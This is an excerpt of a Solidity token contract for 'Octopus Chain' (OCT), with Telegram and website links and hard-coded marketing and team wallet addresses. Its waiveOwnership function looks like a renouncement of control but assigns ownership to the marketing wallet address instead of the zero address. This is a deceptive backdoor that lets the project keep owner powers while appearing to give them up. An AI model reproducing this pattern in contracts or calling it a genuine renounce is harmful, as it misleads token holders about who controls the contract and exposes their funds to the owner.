...
Telegram : https://t.me/octopuschain
Website : https://octopus-chain.com
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x900D4ffd0c6aCD028402d5dB4dC777492034f2da);
    }
...
contract OctopusChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Octopus Chain";
    string private _symbol = "OCT";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x900D4ffd0c6aCD028402d5dB4dC777492034f2da);
    address payable public teamWalletAddress = payable(0x6BB2B3b89E97164CF49833E746C0074188df2Dbd);
